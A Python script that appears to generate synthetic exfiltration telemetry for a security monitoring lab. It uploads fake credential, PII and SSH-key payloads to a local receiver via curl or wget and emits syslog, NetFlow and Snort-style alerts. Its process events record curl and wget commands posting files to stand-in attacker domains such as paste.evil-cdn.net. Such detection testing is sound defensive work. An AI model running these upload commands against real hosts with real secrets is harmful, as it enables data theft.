#!/usr/bin/env python3
"""Simulate data exfiltration using wget and curl, reporting events to Logstash."""

import json
import os
import random
import shlex
import socket
import struct
import subprocess
import sys
import tempfile
import time
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
from urllib.parse import urlparse

SYSLOG_PROGRAM = "exfil-demo"
ENDPOINT_PROCESS_PROGRAM = "endpoint-process-demo"
INFECTED_PREFIX = "10.0.60."
EXFIL_DEST_PREFIXES = (
    "198.18.50.",
    "203.0.113.",
    "185.220.101.",
)
EXFIL_DOMAINS = (
    "paste.evil-cdn.net",
    "upload.shadow-drop.io",
    "data.exfil-gateway.cc",
    "cdn.anon-share.xyz",
)
SENSITIVE_TYPES = (
    "credentials",
    "pii",
    "source_code",
    "database_dump",
    "ssh_keys",
    "financial_records",
)
FILE_TEMPLATES = (
    ("customer_records.csv", "csv"),
    ("prod_db_backup.sql", "sql"),
    ("id_rsa", "pem"),
    ("payroll_q4.xlsx", "xlsx"),
    (".env.production", "env"),
    ("api_tokens.json", "json"),
    ("source_tree.tar.gz", "gz"),
)

NETFLOW_VERSION = 9
TEMPLATE_ID = 256
TEMPLATE_FIELDS = [
    (8, 4),
    (12, 4),
    (4, 1),
    (7, 2),
    (11, 2),
    (6, 1),
    (1, 4),
    (2, 4),
    (10, 4),
    (14, 4),
    (55, 1),
    (58, 2),
    (59, 2),
]

EXFIL_SNORT_SIGNATURES = [
    (2024897, 3, "ET POLICY curl User-Agent Outbound", "Misc activity", 2),
    (2016148, 2, "ET TROJAN Possible Data Exfiltration via HTTP POST", "A Network Trojan was detected", 1),
    (2031003, 1, "ET INFO Suspicious Outbound File Upload via wget", "Misc activity", 2),
    (2010937, 2, "ET POLICY HTTP POST with large body to rare destination", "Potential Corporate Privacy Violation", 1),
]


def env_int(name: str, default: int) -> int:
    value = os.environ.get(name)
    if value is None:
        return default
    return int(value)


def env_float(name: str, default: float) -> float:
    value = os.environ.get(name)
    if value is None:
        return default
    return float(value)


def random_host(prefix: str) -> str:
    if prefix.endswith("."):
        return f"{prefix}{random.randint(1, 254)}"
    return prefix


def random_port() -> int:
    return random.randint(49152, 65535)


def bsd_syslog_timestamp(now: datetime) -> str:
    return now.strftime("%b %d %H:%M:%S").replace(" 0", "  ", 1)


def wrap_syslog(
    priority: int,
    hostname: str,
    program: str,
    message: str,
    now: datetime,
) -> bytes:
    timestamp = bsd_syslog_timestamp(now)
    return f"<{priority}>{timestamp} {hostname} {program}: {message}".encode("utf-8")


def ipv4_to_int(ip: str) -> int:
    return struct.unpack("!I", socket.inet_aton(ip))[0]


def pad_to_32bit(data: bytes) -> bytes:
    pad_len = (4 - (len(data) % 4)) % 4
    return data + (b"\x00" * pad_len)


def build_template_flowset() -> bytes:
    body = struct.pack("!HH", TEMPLATE_ID, len(TEMPLATE_FIELDS))
    for ie_id, length in TEMPLATE_FIELDS:
        body += struct.pack("!HH", ie_id, length)
    body = pad_to_32bit(body)
    return struct.pack("!HH", 0, 4 + len(body)) + body


def build_flow_record(
    *,
    src_ip: str,
    dst_ip: str,
    src_port: int,
    dst_port: int,
    octets: int,
    packets: int,
) -> bytes:
    return struct.pack(
        "!IIBHHBIIIIBHH",
        ipv4_to_int(src_ip),
        ipv4_to_int(dst_ip),
        6,
        src_port,
        dst_port,
        0x18,
        octets,
        packets,
        1,
        1,
        0,
        500,
        0,
    )


def build_data_flowset(records: list[bytes]) -> bytes:
    body = pad_to_32bit(b"".join(records))
    return struct.pack("!HH", TEMPLATE_ID, 4 + len(body)) + body


def build_netflow_datagram(
    *,
    flow_sequence: int,
    sys_uptime_ms: int,
    unix_secs: int,
    src_ip: str,
    dst_ip: str,
    src_port: int,
    dst_port: int,
    octets: int,
    packets: int,
) -> bytes:
    header = struct.pack(
        "!HHIIII",
        NETFLOW_VERSION,
        2,
        sys_uptime_ms,
        unix_secs,
        flow_sequence,
        0,
    )
    record = build_flow_record(
        src_ip=src_ip,
        dst_ip=dst_ip,
        src_port=src_port,
        dst_port=dst_port,
        octets=octets,
        packets=packets,
    )
    return header + build_template_flowset() + build_data_flowset([record])


def build_sensitive_payload(filename: str, sensitive_type: str) -> bytes:
    lines = [
        f"# synthetic {sensitive_type} payload for demo",
        f"filename={filename}",
        f"generated_at={datetime.now(timezone.utc).isoformat()}",
    ]
    if sensitive_type == "credentials":
        lines.extend(
            f"user{index}:$6$rounds=5000$saltsalt$hash{index}"
            for index in range(1, 8)
        )
    elif sensitive_type == "pii":
        lines.extend(
            f"{index},Jane Doe{index},SSN-000-00-{index:04d},555-010{index}"
            for index in range(1, 12)
        )
    elif sensitive_type == "ssh_keys":
        lines.append("-----BEGIN OPENSSH PRIVATE KEY-----")
        lines.append("b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAA")
        lines.append("-----END OPENSSH PRIVATE KEY-----")
    else:
        lines.extend(f"record_{index}={random.randbytes(24).hex()}" for index in range(1, 20))
    return "\n".join(lines).encode("utf-8")


def build_upload_argv(tool: str, payload_path: Path, target_url: str) -> list[str]:
    if tool == "curl":
        return [
            "curl",
            "-fsS",
            "--max-time",
            "10",
            "-X",
            "POST",
            "--data-binary",
            f"@{payload_path}",
            "-H",
            "Content-Type: application/octet-stream",
            "-A",
            "curl/8.5.0 (exfil-demo)",
            target_url,
        ]
    return [
        "wget",
        "-q",
        "--timeout=10",
        "--post-file",
        str(payload_path),
        "--header=Content-Type: application/octet-stream",
        "-O",
        "/dev/null",
        target_url,
    ]


def build_report_argv(tool: str, filename: str, report_url: str) -> list[str]:
    """Argv for synthetic endpoint process events.

    Uploads hit the local receiver, but detection rules exclude localhost/127.0.0.1
    destinations in process.args — report the external exfil URL instead.
    """
    report_path = f"/tmp/{filename}"
    if tool == "curl":
        return [
            "curl",
            "-fsS",
            "--max-time",
            "10",
            "-X",
            "POST",
            "--data-binary",
            f"@{report_path}",
            "-H",
            "Content-Type: application/octet-stream",
            "-A",
            "curl/8.5.0 (exfil-demo)",
            report_url,
        ]
    return [
        "wget",
        "-q",
        "--timeout=10",
        "--post-file",
        report_path,
        "--header=Content-Type: application/octet-stream",
        "-O",
        "/dev/null",
        report_url,
    ]


@dataclass
class ExfilAttempt:
    tool: str
    src_ip: str
    dst_ip: str
    dst_domain: str
    src_port: int
    dst_port: int
    filename: str
    extension: str
    sensitive_type: str
    bytes_sent: int
    http_method: str
    upload_url: str


class ExfilSimulator:
    def __init__(self) -> None:
        self.output_mode = os.environ.get("EXFIL_OUTPUT_MODE", "all").lower()
        self.syslog_target = os.environ.get("EXFIL_SYSLOG_TARGET", "logstash")
        self.syslog_port = env_int("EXFIL_SYSLOG_PORT", 514)
        self.netflow_target = os.environ.get("EXFIL_NETFLOW_TARGET", "logstash")
        self.netflow_port = env_int("EXFIL_NETFLOW_PORT", 2055)
        self.receiver_url = os.environ.get(
            "EXFIL_RECEIVER_URL", "http://127.0.0.1:8888/upload"
        ).rstrip("/")
        self.interval = env_float("EXFIL_INTERVAL", 15)
        self.jitter = env_float("EXFIL_JITTER", 0.2)
        self.hostname = os.environ.get("EXFIL_HOSTNAME", "exfil-demo")
        self.alert_format = os.environ.get("EXFIL_SNORT_FORMAT", "fast").lower()
        self.alert_probability = env_float("EXFIL_ALERT_PROBABILITY", 0.4)
        self.host_count = env_int("EXFIL_HOSTS", 2)

        if self.output_mode not in {"all", "flow", "netflow", "snort", "process"}:
            raise ValueError(f"Unsupported EXFIL_OUTPUT_MODE={self.output_mode!r}")
        if self.alert_format not in {"fast", "snort3", "json"}:
            raise ValueError(f"Unsupported EXFIL_SNORT_FORMAT={self.alert_format!r}")

        self.syslog_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.netflow_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.flow_sequence = random.randint(1, 1_000_000)
        self.start = time.monotonic()
        tools_raw = os.environ.get("EXFIL_TOOLS", "curl,wget").strip()
        self.tools = tuple(
            tool.strip()
            for tool in tools_raw.split(",")
            if tool.strip() in {"curl", "wget"}
        ) or ("curl", "wget")

    def wait_for_receiver(self) -> None:
        parsed = urlparse(self.receiver_url)
        health_url = f"{parsed.scheme}://{parsed.netloc}/health"
        deadline = time.monotonic() + 30
        while time.monotonic() < deadline:
            result = subprocess.run(
                ["curl", "-fsS", "--max-time", "2", health_url],
                capture_output=True,
            )
            if result.returncode == 0:
                return
            time.sleep(0.5)
        print("warning: exfil receiver not reachable, continuing anyway", flush=True)

    def perform_upload(self, tool: str, payload_path: Path) -> tuple[bool, list[str]]:
        argv = build_upload_argv(tool, payload_path, self.receiver_url)
        result = subprocess.run(argv, capture_output=True)
        if result.returncode != 0:
            stderr = result.stderr.decode("utf-8", errors="replace").strip()
            print(f"warning: {tool} upload failed: {stderr}", flush=True)
            return False, argv
        return True, argv

    def build_attempt(self, tool: str) -> ExfilAttempt:
        filename, extension = random.choice(FILE_TEMPLATES)
        sensitive_type = random.choice(SENSITIVE_TYPES)
        payload = build_sensitive_payload(filename, sensitive_type)
        return ExfilAttempt(
            tool=tool,
            src_ip=random_host(INFECTED_PREFIX),
            dst_ip=random_host(random.choice(EXFIL_DEST_PREFIXES)),
            dst_domain=random.choice(EXFIL_DOMAINS),
            src_port=random_port(),
            dst_port=random.choice((80, 443, 8080, 8443)),
            filename=filename,
            extension=extension,
            sensitive_type=sensitive_type,
            bytes_sent=len(payload),
            http_method="POST",
            upload_url=self.receiver_url,
        ), payload

    def build_flow_event(self, attempt: ExfilAttempt, now: datetime) -> dict:
        return {
            "@timestamp": now.isoformat(),
            "event": {
                "category": ["network"],
                "dataset": "exfil.transfer",
                "kind": "event",
                "type": ["info"],
                "action": "data_exfiltration",
            },
            "tags": ["exfil", "data_loss"],
            "network": {
                "transport": "tcp",
                "protocol": "http",
                "bytes": attempt.bytes_sent,
            },
            "source": {
                "ip": attempt.src_ip,
                "port": attempt.src_port,
            },
            "destination": {
                "ip": attempt.dst_ip,
                "port": attempt.dst_port,
                "domain": attempt.dst_domain,
            },
            "file": {
                "name": attempt.filename,
                "extension": attempt.extension,
                "size": attempt.bytes_sent,
            },
            "http": {
                "request": {
                    "method": attempt.http_method,
                },
            },
            "url": {
                "full": f"https://{attempt.dst_domain}/upload",
                "domain": attempt.dst_domain,
                "path": "/upload",
            },
            "exfil": {
                "tool": attempt.tool,
                "sensitive_data_type": attempt.sensitive_type,
                "bytes_sent": attempt.bytes_sent,
                "upload_url": attempt.upload_url,
            },
        }

    def send_flow_event(self, event: dict, now: datetime) -> None:
        body = json.dumps(event, separators=(",", ":"))
        self.syslog_sock.sendto(
            wrap_syslog(21 * 8 + 6, self.hostname, SYSLOG_PROGRAM, body, now),
            (self.syslog_target, self.syslog_port),
        )

    def build_process_event(self, argv: list[str], now: datetime) -> dict:
        command_line = " ".join(shlex.quote(arg) for arg in argv)
        parent_executable = sys.executable or "/usr/bin/python3.12"
        return {
            "@timestamp": now.isoformat(),
            "event": {
                "action": "exec",
                "category": ["process"],
                "dataset": "endpoint.events.process",
                "kind": "event",
                "type": "start",
            },
            "agent": {
                "id": "exfil-demo-endpoint",
                "type": "endpoint",
                "version": "8.17.4",
            },
            "host": {
                "name": self.hostname,
                "hostname": self.hostname,
                "os": {
                    "type": "linux",
                    "family": "debian",
                    "platform": "debian",
                },
            },
            "process": {
                "name": argv[0],
                "executable": f"/usr/bin/{argv[0]}",
                "args": argv,
                "command_line": command_line,
                "pid": random.randint(2000, 65000),
                "parent": {
                    "name": Path(parent_executable).name,
                    "executable": parent_executable,
                    "pid": 1,
                },
            },
        }

    def send_process_event(self, argv: list[str], now: datetime) -> None:
        body = json.dumps(self.build_process_event(argv, now), separators=(",", ":"))
        self.syslog_sock.sendto(
            wrap_syslog(21 * 8 + 6, self.hostname, ENDPOINT_PROCESS_PROGRAM, body, now),
            (self.syslog_target, self.syslog_port),
        )

    def send_netflow(self, attempt: ExfilAttempt, now: datetime) -> None:
        sys_uptime_ms = int((time.monotonic() - self.start) * 1000) & 0xFFFFFFFF
        packets = max(1, attempt.bytes_sent // 1400 + 1)
        datagram = build_netflow_datagram(
            flow_sequence=self.flow_sequence,
            sys_uptime_ms=sys_uptime_ms,
            unix_secs=int(now.timestamp()),
            src_ip=attempt.src_ip,
            dst_ip=attempt.dst_ip,
            src_port=attempt.src_port,
            dst_port=attempt.dst_port,
            octets=attempt.bytes_sent + random.randint(200, 800),
            packets=packets,
        )
        self.netflow_sock.sendto(datagram, (self.netflow_target, self.netflow_port))
        self.flow_sequence = (self.flow_sequence + 1) & 0xFFFFFFFF

    def send_snort_alert(self, attempt: ExfilAttempt, now: datetime) -> None:
        sid, rev, msg, classification, priority = random.choice(EXFIL_SNORT_SIGNATURES)
        full_msg = f"{msg} ({attempt.tool} {attempt.filename} {attempt.bytes_sent}B)"
        syslog_priority = 21 * 8 + 1
        flow = f"{attempt.src_ip}:{attempt.src_port} -> {attempt.dst_ip}:{attempt.dst_port}"

        if self.alert_format == "json":
            body = json.dumps(
                {
                    "timestamp": now.strftime("%m/%d-%H:%M:%S.") + f"{now.microsecond:06d}",
                    "proto": "TCP",
                    "src_addr": attempt.src_ip,
                    "src_port": attempt.src_port,
                    "dst_addr": attempt.dst_ip,
                    "dst_port": attempt.dst_port,
                    "rule": f"1:{sid}:{rev}",
                    "action": "alert",
                    "msg": full_msg,
                    "class": classification,
                    "priority": priority,
                    "exfil_tool": attempt.tool,
                    "file_name": attempt.filename,
                    "bytes_sent": attempt.bytes_sent,
                },
                separators=(",", ": "),
            )
        elif self.alert_format == "snort3":
            body = f'[1:{sid}:{rev}] "{full_msg}" {{TCP}} {flow}'
        else:
            body = (
                f"[1:{sid}:{rev}] {full_msg} "
                f"[Classification: {classification}] [Priority: {priority}] "
                f"{{TCP}} {flow}"
            )

        payload = wrap_syslog(syslog_priority, self.hostname, SYSLOG_PROGRAM, body, now)
        self.syslog_sock.sendto(payload, (self.syslog_target, self.syslog_port))

    def emit_exfil(self, tool: str, now: datetime) -> None:
        attempt, payload = self.build_attempt(tool)
        with tempfile.NamedTemporaryFile(delete=False, suffix=f"_{attempt.filename}") as handle:
            handle.write(payload)
            payload_path = Path(handle.name)

        try:
            ok, _upload_argv = self.perform_upload(tool, payload_path)
            if not ok:
                return
            report_url = f"https://{attempt.dst_domain}/upload"
            print(
                f"exfil via {tool}: {attempt.filename} ({attempt.bytes_sent}B) "
                f"{attempt.src_ip} -> {attempt.dst_domain}",
                flush=True,
            )
            if self.output_mode in {"all", "flow"}:
                self.send_flow_event(self.build_flow_event(attempt, now), now)
            if self.output_mode in {"all", "netflow"}:
                self.send_netflow(attempt, now)
            if self.output_mode in {"all", "snort"} and random.random() < self.alert_probability:
                self.send_snort_alert(attempt, now)
            if self.output_mode in {"all", "process"}:
                report_argv = build_report_argv(tool, attempt.filename, report_url)
                self.send_process_event(report_argv, now)
        finally:
            payload_path.unlink(missing_ok=True)

    def run(self) -> None:
        self.wait_for_receiver()
        print(
            f"Simulating data exfiltration (mode={self.output_mode}) "
            f"uploads→{self.receiver_url} "
            f"syslog→{self.syslog_target}:{self.syslog_port} "
            f"netflow→{self.netflow_target}:{self.netflow_port} "
            f"interval≈{self.interval}s tools={','.join(self.tools)}",
            flush=True,
        )

        tool_index = 0
        while True:
            now = datetime.now(timezone.utc)
            tool = self.tools[tool_index % len(self.tools)]
            self.emit_exfil(tool, now)
            tool_index += 1
            jitter_factor = 1.0 + random.uniform(-self.jitter, self.jitter)
            time.sleep(max(1.0, self.interval * jitter_factor))


def main() -> int:
    try:
        simulator = ExfilSimulator()
    except ValueError as exc:
        print(str(exc), file=sys.stderr)
        return 1

    try:
        simulator.run()
    except KeyboardInterrupt:
        print("\nStopped.", flush=True)
        return 0
    except OSError as exc:
        print(f"Error during exfil simulation: {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
